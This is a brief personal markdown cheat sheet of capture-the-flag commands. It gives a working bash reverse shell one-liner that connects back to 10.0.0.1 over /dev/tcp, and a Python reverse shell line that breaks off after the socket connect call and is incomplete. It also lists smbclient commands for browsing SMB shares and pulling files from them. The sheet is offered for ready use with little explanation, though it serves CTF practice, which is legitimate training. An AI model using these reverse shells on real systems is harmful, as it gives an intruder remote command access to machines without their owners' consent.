# My Personal list of CTF commands

## Reverse Shell Cheat Sheet

[PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Bash

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### Python

```python
python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(("10.0.0.1", 1234))
```

## SMBClient

List  
`smbclient -l <IPAddress>`  

Connect/Shell

```bash
smbclient -U username //ip/share
    * ls: List files and directories
    * cd directory: Change to a specified directory
    * get filename: Retrieve a file
    * mget file1 file2: Retrieve multiple files
    * put filename: Upload a file
    * mput file1 file2: Upload multiple files
    * mkdir directory: Make a directory
    * more filename: Examine the contents of a text file
    * tar c all.tar: Retrieve all of the files in the current share directory and subdirectories into a local tar file called all.tar
    * exit: Close the session  
```

